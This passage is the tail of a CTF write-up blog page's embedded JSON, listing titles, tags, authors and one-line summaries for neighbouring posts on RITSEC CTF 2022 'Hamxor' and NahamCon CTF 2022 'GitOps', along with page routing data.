Hamxor","date":"2022-04-03T00:00:00.000Z","draft":false,"authors":["sahuang"],"tags":["RITSEC CTF 2022","Misc","XOR","Hamming Code"],"summary":"Error correction with xor for the win.","slug":"ritsec-ctf-2022/hamxor"},"next":{"title":"NahamCon CTF 2022 – GitOps","date":"2022-05-02T00:00:00.000Z","draft":false,"authors":["TheButcher"],"tags":["NahamCon CTF 2022","Misc","DevOps","Git","Pipeline","Gitea","DroneCI"],"summary":"Abuse the pipeline execution process to gain access to the host.","slug":"nahamcon-ctf-2022/gitops"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["crew-ctf-2022","EzChall"]},"buildId":"0wxHpwy3ehtFejYPlY-Z7","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>